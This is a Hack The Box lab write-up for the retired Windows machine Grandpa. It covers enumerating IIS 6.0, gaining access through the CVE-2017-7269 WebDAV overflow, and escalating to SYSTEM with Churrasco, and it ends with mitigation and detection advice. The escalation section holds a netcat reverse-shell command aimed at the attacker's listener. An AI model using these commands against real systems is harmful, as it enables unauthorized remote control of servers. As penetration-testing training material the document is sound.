---
machine: Grandpa
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, iis, webdav, cve-2017-7269, seimpersonate, churrasco]
---

# Grandpa — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

IIS 6.0 with WebDAV is vulnerable to CVE-2017-7269, a buffer overflow in `ScStoragePathFromUrl` reachable with a malformed `PROPFIND`. The shell is `NETWORK SERVICE`; with `SeImpersonatePrivilege` and Churrasco, it becomes `SYSTEM`.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80 <IP>
```

```text
80/tcp open  http  Microsoft IIS httpd 6.0
```

The host is Windows Server 2003. Confirm WebDAV with `OPTIONS` and `PROPFIND`. Unlike Granny, the main vector here is the overflow, not file upload.

## Initial access

Use a public CVE-2017-7269 exploit that sends a `PROPFIND` with an oversized `If:` header:

```bash
python3 iis6-exploit-2017-CVE-2017-7269.py <IP> 80
```

The exploit returns a reverse shell as `NT AUTHORITY\NETWORK SERVICE`.

## Escalation to SYSTEM

```bash
whoami /priv
# SeImpersonatePrivilege  Enabled
```

Transfer `churrasco.exe` and `nc.exe` to the host (SMB, TFTP or `copy` from a share):

```cmd
C:\temp\churrasco.exe -d "C:\temp\nc.exe -e cmd.exe <LHOST> <LPORT>"
```

The listener receives `NT AUTHORITY\SYSTEM`. Read and redact the flag.

## Evidence

- `nmap` showing IIS 6.0.
- Exploit `PROPFIND` and `NETWORK SERVICE` shell.
- `whoami /priv`.
- SYSTEM shell through Churrasco.

## Lessons learned

- CVE-2017-7269 is a stack overflow in WebDAV path parsing.
- A single `PROPFIND` can achieve RCE on IIS 6.0.
- `NETWORK SERVICE` with `SeImpersonatePrivilege` leads to SYSTEM on Server 2003.
- Tool transfer on legacy systems needs alternatives to `certutil`.

## Mitigation and detection

- Disable WebDAV and update IIS/Windows Server.
- Block `PROPFIND` with anomalous `If:` headers at the WAF.
- Restrict `SeImpersonatePrivilege`.
- Detect child processes of `w3wp.exe` and outbound connections from IIS.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2017-7269>
- <https://www.hackthebox.com/machines/grandpa>
- <https://attack.mitre.org/techniques/T1190/>
